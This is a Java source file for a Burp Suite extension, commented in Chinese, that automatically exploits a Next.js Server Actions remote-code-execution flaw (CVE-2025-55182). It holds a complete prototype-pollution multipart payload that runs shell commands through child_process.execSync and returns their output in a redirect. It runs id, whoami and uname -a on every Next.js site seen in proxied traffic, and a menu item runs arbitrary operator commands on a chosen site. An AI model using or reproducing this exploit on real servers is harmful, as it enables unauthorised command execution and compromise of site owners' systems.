package burp;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;

/**
 * CVE-2025-55182 Next.js RCE Passive Scanner
 * 
 * 功能：
 * - 被动扫描：自动检测经过 Burp 的 Next.js 站点
 * - 自动利用：发现漏洞后自动执行命令获取结果
 * - 列表展示：表格形式显示所有发现的漏洞站点
 */
public class BurpExtender implements IBurpExtender, ITab, IHttpListener, IContextMenuFactory {
    
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private PrintWriter stdout;
    private PrintWriter stderr;
    
    // UI Components
    private JPanel mainPanel;
    private JTable resultsTable;
    private DefaultTableModel tableModel;
    private JTextArea logArea;
    private JLabel statusLabel;
    
    // Track scanned hosts
    private ConcurrentHashMap<String, Boolean> scannedHosts = new ConcurrentHashMap<>();
    private ConcurrentHashMap<String, VulnInfo> vulnerableHosts = new ConcurrentHashMap<>();
    
    // Settings
    private volatile boolean scanEnabled = true;
    
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.helpers = callbacks.getHelpers();
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.stderr = new PrintWriter(callbacks.getStderr(), true);
        
        callbacks.setExtensionName("Next.js RCE Scanner");
        
        // Register as HTTP listener for passive scanning
        callbacks.registerHttpListener(this);
        
        // Register context menu
        callbacks.registerContextMenuFactory(this);
        
        // Create UI
        SwingUtilities.invokeLater(() -> {
            createUI();
            callbacks.addSuiteTab(this);
        });
        
        printBanner();
    }
    
    private void printBanner() {
        stdout.println("╔════════════════════════════════════════════════════════════╗");
        stdout.println("║     CVE-2025-55182 Next.js RCE Passive Scanner             ║");
        stdout.println("║                                                            ║");
        stdout.println("║  Author: Cr4at0r                                           ║");
        stdout.println("║  GitHub: https://github.com/Cr4at0r                        ║");
        stdout.println("║                                                            ║");
        stdout.println("║  [!] 被动扫描已启动                                         ║");
        stdout.println("║  [*] 浏览网站时自动检测 Next.js 并测试漏洞                   ║");
        stdout.println("║  [*] 发现漏洞后自动执行命令并显示结果                        ║");
        stdout.println("╚════════════════════════════════════════════════════════════╝");
    }
    
    private void createUI() {
        mainPanel = new JPanel(new BorderLayout(5, 5));
        mainPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
        
        // Top panel - Status and controls
        JPanel topPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        topPanel.setBorder(BorderFactory.createTitledBorder("扫描状态"));
        
        statusLabel = new JLabel("● 被动扫描已启用 - 浏览网站时自动检测");
        statusLabel.setForeground(new Color(0, 150, 0));
        statusLabel.setFont(new Font("Dialog", Font.BOLD, 14));
        topPanel.add(statusLabel);
        
        JCheckBox enableScan = new JCheckBox("启用扫描", true);
        enableScan.addActionListener(e -> {
            scanEnabled = enableScan.isSelected();
            if (scanEnabled) {
                statusLabel.setText("● 被动扫描已启用 - 浏览网站时自动检测");
                statusLabel.setForeground(new Color(0, 150, 0));
            } else {
                statusLabel.setText("○ 被动扫描已禁用");
                statusLabel.setForeground(Color.GRAY);
            }
        });
        topPanel.add(enableScan);
        
        JButton clearButton = new JButton("清空结果");
        clearButton.addActionListener(e -> {
            tableModel.setRowCount(0);
            scannedHosts.clear();
            vulnerableHosts.clear();
            log("[*] 已清空扫描结果");
        });
        topPanel.add(clearButton);
        
        JButton exportButton = new JButton("导出结果");
        exportButton.addActionListener(e -> exportResults());
        topPanel.add(exportButton);
        
        mainPanel.add(topPanel, BorderLayout.NORTH);
        
        // Center panel - Results table
        JPanel tablePanel = new JPanel(new BorderLayout());
        tablePanel.setBorder(BorderFactory.createTitledBorder("发现的漏洞站点"));
        
        // Table columns
        String[] columns = {"#", "目标URL", "状态", "用户信息", "系统信息", "发现时间"};
        tableModel = new DefaultTableModel(columns, 0) {
            @Override
            public boolean isCellEditable(int row, int column) {
                return false;
            }
        };
        
        resultsTable = new JTable(tableModel);
        resultsTable.setFont(new Font("Monospaced", Font.PLAIN, 12));
        resultsTable.setRowHeight(25);
        resultsTable.getColumnModel().getColumn(0).setPreferredWidth(30);
        resultsTable.getColumnModel().getColumn(1).setPreferredWidth(300);
        resultsTable.getColumnModel().getColumn(2).setPreferredWidth(80);
        resultsTable.getColumnModel().getColumn(3).setPreferredWidth(200);
        resultsTable.getColumnModel().getColumn(4).setPreferredWidth(250);
        resultsTable.getColumnModel().getColumn(5).setPreferredWidth(150);
        
        // Add popup menu to table
        JPopupMenu popup = new JPopupMenu();
        JMenuItem copyUrl = new JMenuItem("复制URL");
        copyUrl.addActionListener(e -> {
            int row = resultsTable.getSelectedRow();
            if (row >= 0) {
                String url = (String) tableModel.getValueAt(row, 1);
                java.awt.Toolkit.getDefaultToolkit().getSystemClipboard()
                    .setContents(new java.awt.datatransfer.StringSelection(url), null);
            }
        });
        popup.add(copyUrl);
        
        JMenuItem executeCmd = new JMenuItem("执行命令...");
        executeCmd.addActionListener(e -> {
            int row = resultsTable.getSelectedRow();
            if (row >= 0) {
                String url = (String) tableModel.getValueAt(row, 1);
                String cmd = JOptionPane.showInputDialog(mainPanel, "输入要执行的命令:", "ls -la");
                if (cmd != null && !cmd.isEmpty()) {
                    executeCommandOnTarget(url, cmd);
                }
            }
        });
        popup.add(executeCmd);
        
        resultsTable.setComponentPopupMenu(popup);
        
        JScrollPane tableScroll = new JScrollPane(resultsTable);
        tableScroll.setPreferredSize(new Dimension(900, 300));
        tablePanel.add(tableScroll, BorderLayout.CENTER);
        
        mainPanel.add(tablePanel, BorderLayout.CENTER);
        
        // Bottom panel - Log
        JPanel logPanel = new JPanel(new BorderLayout());
        logPanel.setBorder(BorderFactory.createTitledBorder("扫描日志"));
        
        logArea = new JTextArea();
        logArea.setEditable(false);
        logArea.setFont(new Font("Monospaced", Font.PLAIN, 11));
        logArea.setBackground(new Color(30, 30, 30));
        logArea.setForeground(new Color(0, 255, 0));
        
        JScrollPane logScroll = new JScrollPane(logArea);
        logScroll.setPreferredSize(new Dimension(900, 150));
        logPanel.add(logScroll, BorderLayout.CENTER);
        
        mainPanel.add(logPanel, BorderLayout.SOUTH);
        
        log("[*] 扩展加载完成");
        log("[*] 被动扫描已启动 - 浏览网站时自动检测 Next.js 漏洞");
    }
    
    @Override
    public String getTabCaption() {
        return "Next.js RCE";
    }
    
    @Override
    public Component getUiComponent() {
        return mainPanel;
    }
    
    // ==================== HTTP Listener (被动扫描核心) ====================
    
    @Override
    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
        // Only process responses, not requests
        if (messageIsRequest || !scanEnabled) {
            return;
        }
        
        // Run in background thread to not block Burp
        new Thread(() -> processResponse(messageInfo)).start();
    }
    
    private void processResponse(IHttpRequestResponse messageInfo) {
        try {
            IHttpService service = messageInfo.getHttpService();
            String host = service.getHost();
            String baseUrl = service.getProtocol() + "://" + host;
            if ((service.getProtocol().equals("https") && service.getPort() != 443) ||
                (service.getProtocol().equals("http") && service.getPort() != 80)) {
                baseUrl += ":" + service.getPort();
            }
            
            // Skip if already scanned
            if (scannedHosts.containsKey(baseUrl)) {
                return;
            }
            
            byte[] response = messageInfo.getResponse();
            if (response == null) return;
            
            String responseStr = helpers.bytesToString(response);
            IResponseInfo responseInfo = helpers.analyzeResponse(response);
            
            // Check if it's a Next.js site
            if (!isNextJsSite(responseStr, responseInfo)) {
                return;
            }
            
            // Mark as scanned
            scannedHosts.put(baseUrl, true);
            log("[*] 检测到 Next.js 站点: " + baseUrl);
            
            // Test for vulnerability
            VulnInfo vulnInfo = checkVulnerability(service, baseUrl);
            
            if (vulnInfo != null && vulnInfo.isVulnerable) {
                vulnerableHosts.put(baseUrl, vulnInfo);
                log("[+] 发现漏洞! " + baseUrl);
                log("[+] 用户: " + vulnInfo.userInfo);
                log("[+] 系统: " + vulnInfo.systemInfo);
                
                // Add to table
                addToTable(vulnInfo);
                
                // Also report to Burp Scanner
                reportIssue(messageInfo, vulnInfo);
            } else {
                log("[-] 未发现漏洞: " + baseUrl);
            }
            
        } catch (Exception e) {
            // Silently ignore errors
        }
    }
    
    private boolean isNextJsSite(String response, IResponseInfo responseInfo) {
        String[] indicators = {
            "_next/static", "__NEXT_DATA__", "/_next/",
            "next/dist", "x-nextjs-", "__next", "Next.js"
        };
        
        for (String indicator : indicators) {
            if (response.contains(indicator)) {
                return true;
            }
        }
        
        for (String header : responseInfo.getHeaders()) {
            String lowerHeader = header.toLowerCase();
            if (lowerHeader.contains("x-nextjs") || 
                lowerHeader.contains("x-powered-by: next")) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * 检测漏洞并自动执行命令获取信息
     */
    private VulnInfo checkVulnerability(IHttpService service, String baseUrl) {
        VulnInfo info = new VulnInfo();
        info.url = baseUrl;
        info.timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
        
        // 生成随机测试字符串
        String testString = generateRandomString(8);
        String testCommand = "echo " + testString;
        
        // 尝试常见路径 - 与 Python 脚本一致，优先使用 /apps
        String[] paths = {"/apps", "/", "/en", "/api/action", "/login"};
        
        for (String path : paths) {
            log("[*] 测试路径: " + baseUrl + path);
            String result = executeExploit(service, path, testCommand);
            
            if (result != null && result.contains(testString)) {
                info.isVulnerable = true;
                info.vulnPath = path;
                log("[+] 路径有效: " + path);
                
                // 使用简单命令获取用户信息 - 不使用 shell 重定向
                String userResult = executeExploit(service, path, "id");
                if (userResult != null && !userResult.isEmpty()) {
                    info.userInfo = userResult.trim();
                    log("[+] 获取用户信息成功: " + info.userInfo);
                } else {
                    // 尝试 whoami
                    userResult = executeExploit(service, path, "whoami");
                    if (userResult != null && !userResult.isEmpty()) {
                        info.userInfo = userResult.trim();
                        log("[+] 获取用户信息成功: " + info.userInfo);
                    }
                }
                
                // 使用简单命令获取系统信息
                String sysResult = executeExploit(service, path, "uname -a");
                if (sysResult != null && !sysResult.isEmpty()) {
                    info.systemInfo = sysResult.trim();
                    if (info.systemInfo.length() > 80) {
                        info.systemInfo = info.systemInfo.substring(0, 80) + "...";
                    }
                    log("[+] 获取系统信息成功: " + info.systemInfo);
                }
                
                return info;
            }
        }
        
        return info;
    }
    
    /**
     * 执行漏洞利用并返回结果
     * 使用与 Python 脚本完全相同的 payload 格式
     */
    private String executeExploit(IHttpService service, String path, String command) {
        try {
            // ===== 使用与 Python 脚本完全相同的 payload =====
            // Python: var res=process.mainModule.require('child_process').execSync('{command} | base64 -w 0').toString().trim();
            //         throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});
            
            String escapedCommand = command.replace("'", "\\'");
            
            String prefix = String.format(
                "var res=process.mainModule.require('child_process').execSync('%s | base64 -w 0').toString().trim();" +
                ";throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
                escapedCommand
            );
            
            // 构造与 Python 脚本完全一致的 payload 结构
            String payloadJson = String.format(
                "{\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\"then\\\":\\\"$B1337\\\"}\",\"_response\":{\"_prefix\":\"%s\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}}",
                prefix.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n")
            );
            
            String boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
            
            // 构造 multipart body - 与 Python 脚本格式完全一致
            StringBuilder body = new StringBuilder();
            body.append("------").append(boundary).append("\r\n");
            body.append("Content-Disposition: form-data; name=\"0\"\r\n\r\n");
            body.append(payloadJson).append("\r\n");
            body.append("------").append(boundary).append("\r\n");
            body.append("Content-Disposition: form-data; name=\"1\"\r\n\r\n");
            body.append("\"$@0\"").append("\r\n");
            body.append("------").append(boundary).append("\r\n");
            body.append("Content-Disposition: form-data; name=\"2\"\r\n\r\n");
            body.append("[]").append("\r\n");
            body.append("------").append(boundary).append("--");
            
            // 构造请求头 - 与 Python 脚本一致
            List<String> headers = new ArrayList<>();
            headers.add("POST " + path + " HTTP/1.1");
            headers.add("Host: " + service.getHost());
            headers.add("Content-Type: multipart/form-data; boundary=----" + boundary);
            headers.add("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0");
            headers.add("Next-Action: x");
            headers.add("Accept: */*");
            headers.add("Connection: close");
            
            byte[] request = helpers.buildHttpMessage(headers, body.toString().getBytes("UTF-8"));
            IHttpRequestResponse response = callbacks.makeHttpRequest(service, request);
            
            if (response.getResponse() != null) {
                IResponseInfo respInfo = helpers.analyzeResponse(response.getResponse());
                int statusCode = respInfo.getStatusCode();
                
                // 检查响应状态码 - 302, 303, 307 都可能
                if (statusCode == 302 || statusCode == 303 || statusCode == 307) {
                    // 先检查 x-action-redirect，再检查 Location
                    String redirectUrl = getHeader(respInfo, "x-action-redirect");
                    if (redirectUrl == null || redirectUrl.isEmpty()) {
                        redirectUrl = getHeader(respInfo, "Location");
                    }
                    
                    if (redirectUrl != null && redirectUrl.contains("?a=")) {
                        return extractResult(redirectUrl);
                    }
                }
                
                // 也检查响应体
                String responseStr = helpers.bytesToString(response.getResponse());
                java.util.regex.Pattern pattern = java.util.regex.Pattern.compile("/login\\?a=([A-Za-z0-9+/=]+)");
                java.util.regex.Matcher matcher = pattern.matcher(responseStr);
                if (matcher.find()) {
                    String encoded = matcher.group(1);
                    try {
                        return new String(helpers.base64Decode(encoded), "UTF-8");
                    } catch (Exception e) {
                        // Ignore
                    }
                }
            }
            
        } catch (Exception e) {
            stderr.println("Exploit error: " + e.getMessage());
        }
        
        return null;
    }
    
    private String extractResult(String redirectUrl) {
        try {
            if (redirectUrl.contains("?a=")) {
                String encoded = redirectUrl.split("\\?a=")[1];
                if (encoded.contains("&")) {
                    encoded = encoded.split("&")[0];
                }
                if (encoded.contains(";")) {
                    encoded = encoded.split(";")[0];
                }
                encoded = helpers.urlDecode(encoded);
                return new String(helpers.base64Decode(encoded), "UTF-8");
            }
        } catch (Exception e) {
            stderr.println("Extract error: " + e.getMessage());
        }
        return null;
    }
    
    private String getHeader(IResponseInfo responseInfo, String headerName) {
        for (String header : responseInfo.getHeaders()) {
            if (header.toLowerCase().startsWith(headerName.toLowerCase() + ":")) {
                return header.substring(headerName.length() + 1).trim();
            }
        }
        return null;
    }
    
    private String generateRandomString(int length) {
        String chars = "abcdefghijklmnopqrstuvwxyz";
        StringBuilder sb = new StringBuilder();
        Random random = new Random();
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }
        return sb.toString();
    }
    
    // ==================== 表格操作 ====================
    
    private void addToTable(VulnInfo info) {
        SwingUtilities.invokeLater(() -> {
            int rowNum = tableModel.getRowCount() + 1;
            Object[] row = {
                rowNum,
                info.url,
                "存在漏洞",
                info.userInfo != null ? info.userInfo : "N/A",
                info.systemInfo != null ? info.systemInfo : "N/A",
                info.timestamp
            };
            tableModel.addRow(row);
        });
    }
    
    private void executeCommandOnTarget(String url, String command) {
        new Thread(() -> {
            try {
                log("[*] 执行命令: " + command + " @ " + url);
                
                java.net.URL parsedUrl = new java.net.URL(url);
                String host = parsedUrl.getHost();
                int port = parsedUrl.getPort() == -1 ? 
                    (parsedUrl.getProtocol().equals("https") ? 443 : 80) : parsedUrl.getPort();
                boolean useHttps = parsedUrl.getProtocol().equals("https");
                
                IHttpService service = helpers.buildHttpService(host, port, useHttps);
                
                VulnInfo info = vulnerableHosts.get(url);
                String path = info != null && info.vulnPath != null ? info.vulnPath : "/apps";
                
                String result = executeExploit(service, path, command);
                
                if (result != null) {
                    log("[+] 命令输出:\n" + result);
                } else {
                    log("[-] 命令执行失败");
                }
                
            } catch (Exception e) {
                log("[!] 错误: " + e.getMessage());
            }
        }).start();
    }
    
    private void exportResults() {
        StringBuilder sb = new StringBuilder();
        sb.append("# CVE-2025-55182 Scan Results\n");
        sb.append("# Generated: ").append(new Date()).append("\n\n");
        
        for (int i = 0; i < tableModel.getRowCount(); i++) {
            sb.append("URL: ").append(tableModel.getValueAt(i, 1)).append("\n");
            sb.append("User: ").append(tableModel.getValueAt(i, 3)).append("\n");
            sb.append("System: ").append(tableModel.getValueAt(i, 4)).append("\n");
            sb.append("Time: ").append(tableModel.getValueAt(i, 5)).append("\n");
            sb.append("---\n");
        }
        
        // Copy to clipboard
        java.awt.Toolkit.getDefaultToolkit().getSystemClipboard()
            .setContents(new java.awt.datatransfer.StringSelection(sb.toString()), null);
        
        log("[*] 结果已复制到剪贴板 (" + tableModel.getRowCount() + " 条记录)");
    }
    
    private void reportIssue(IHttpRequestResponse messageInfo, VulnInfo info) {
        try {
            IScanIssue issue = new NextJSRCEIssue(
                messageInfo.getHttpService(),
                helpers.analyzeRequest(messageInfo).getUrl(),
                new IHttpRequestResponse[]{messageInfo},
                info
            );
            callbacks.addScanIssue(issue);
        } catch (Exception e) {
            // Ignore
        }
    }
    
    // ==================== Context Menu ====================
    
    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        List<JMenuItem> menuItems = new ArrayList<>();
        
        IHttpRequestResponse[] messages = invocation.getSelectedMessages();
        if (messages != null && messages.length > 0) {
            JMenuItem scanItem = new JMenuItem("测试 Next.js RCE 漏洞");
            scanItem.addActionListener(e -> {
                for (IHttpRequestResponse message : messages) {
                    new Thread(() -> processResponse(message)).start();
                }
            });
            menuItems.add(scanItem);
        }
        
        return menuItems;
    }
    
    // ==================== 日志 ====================
    
    private void log(String message) {
        SwingUtilities.invokeLater(() -> {
            String timestamp = new SimpleDateFormat("HH:mm:ss").format(new Date());
            logArea.append("[" + timestamp + "] " + message + "\n");
            logArea.setCaretPosition(logArea.getDocument().getLength());
        });
        stdout.println(message);
    }
    
    // ==================== 数据类 ====================
    
    class VulnInfo {
        String url;
        boolean isVulnerable = false;
        String vulnPath;
        String userInfo;
        String systemInfo;
        String timestamp;
    }
    
    // ==================== Scan Issue ====================
    
    class NextJSRCEIssue implements IScanIssue {
        private IHttpService httpService;
        private java.net.URL url;
        private IHttpRequestResponse[] httpMessages;
        private VulnInfo vulnInfo;
        
        public NextJSRCEIssue(IHttpService httpService, java.net.URL url, 
                             IHttpRequestResponse[] httpMessages, VulnInfo vulnInfo) {
            this.httpService = httpService;
            this.url = url;
            this.httpMessages = httpMessages;
            this.vulnInfo = vulnInfo;
        }
        
        @Override
        public java.net.URL getUrl() { return url; }
        
        @Override
        public String getIssueName() { return "Next.js Remote Code Execution (CVE-2025-55182)"; }
        
        @Override
        public int getIssueType() { return 0x08000000; }
        
        @Override
        public String getSeverity() { return "High"; }
        
        @Override
        public String getConfidence() { return "Certain"; }
        
        @Override
        public String getIssueBackground() {
            return "A Remote Code Execution vulnerability exists in Next.js Server Actions. " +
                   "An attacker can exploit prototype pollution in the form data parser to execute arbitrary commands.";
        }
        
        @Override
        public String getRemediationBackground() {
            return "Update Next.js to a patched version.";
        }
        
        @Override
        public String getIssueDetail() {
            StringBuilder sb = new StringBuilder();
            sb.append("<p><b>CVE-2025-55182 - Next.js Remote Code Execution</b></p>");
            sb.append("<p>The target application is running a vulnerable version of Next.js.</p>");
            sb.append("<p><b>Exploitation Results:</b></p>");
            sb.append("<ul>");
            sb.append("<li><b>User:</b> ").append(escapeHtml(vulnInfo.userInfo)).append("</li>");
            sb.append("<li><b>System:</b> ").append(escapeHtml(vulnInfo.systemInfo)).append("</li>");
            sb.append("<li><b>Vulnerable Path:</b> ").append(vulnInfo.vulnPath).append("</li>");
            sb.append("</ul>");
            return sb.toString();
        }
        
        @Override
        public String getRemediationDetail() {
            return "1. Update Next.js to the latest patched version<br>" +
                   "2. Review and sanitize all user inputs<br>" +
                   "3. Implement proper Content Security Policy";
        }
        
        @Override
        public IHttpRequestResponse[] getHttpMessages() { return httpMessages; }
        
        @Override
        public IHttpService getHttpService() { return httpService; }
        
        private String escapeHtml(String str) {
            if (str == null) return "N/A";
            return str.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
        }
    }
}
